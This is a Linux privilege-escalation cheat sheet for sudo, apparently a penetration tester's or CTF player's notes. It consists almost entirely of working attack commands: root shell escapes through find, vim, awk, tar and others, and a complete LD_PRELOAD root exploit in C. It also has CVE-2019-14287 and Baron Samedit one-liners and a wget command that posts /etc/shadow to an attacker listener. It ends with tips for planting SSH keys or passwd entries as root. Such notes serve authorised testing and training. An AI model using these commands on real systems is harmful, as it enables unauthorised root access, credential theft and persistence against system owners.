# Linux privesc: sudo

## What I may run
sudo -l
sudo -V | head -1
- [ ] Every allowed program looked up on GTFOBins, gtfobins.github.io
- [ ] (ALL) NOPASSWD: a program I can run as root with no password
- [ ] (someone) NOPASSWD: a program I can run as that user, with sudo -u
- [ ] env_keep+=LD_PRELOAD: root through any allowed program
- [ ] (ALL, !root) ALL on sudo older than 1.8.28: CVE-2019-14287
- [ ] An allowed script: read it for programs called by bare name, files I can write, and wildcards

## Shell escapes
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh";'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo env /bin/sh
- [ ] less, more, man, git -p help config: run it, then type !/bin/sh

## As another user
sudo -u '<Username>' /bin/bash

## LD_PRELOAD kept
```
cat > /tmp/pe.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
```
Then any program sudo -l allows, with the library in front:
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/find

## An old sudo
CVE-2019-14287, with (ALL, !root):
sudo -u#-1 /bin/bash
CVE-2021-3156, Baron Samedit, on 1.8.2 to 1.8.31p2 and 1.9.0 to 1.9.5p1: a crash here means vulnerable, then searchsploit.
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

## Read and write files through an allowed program
A root-only file sent to Kali by wget, with nc -lvnp <LPORT> listening there:
sudo wget --post-file=/etc/shadow http://<LHOST>:<LPORT>/
cp, to the terminal, since a copy it writes keeps shadow's owner and mode:
sudo cp /etc/shadow /dev/stdout
- [ ] Write as root: a sudoers line, an SSH key in /root/.ssh/authorized_keys, or a root line in /etc/passwd
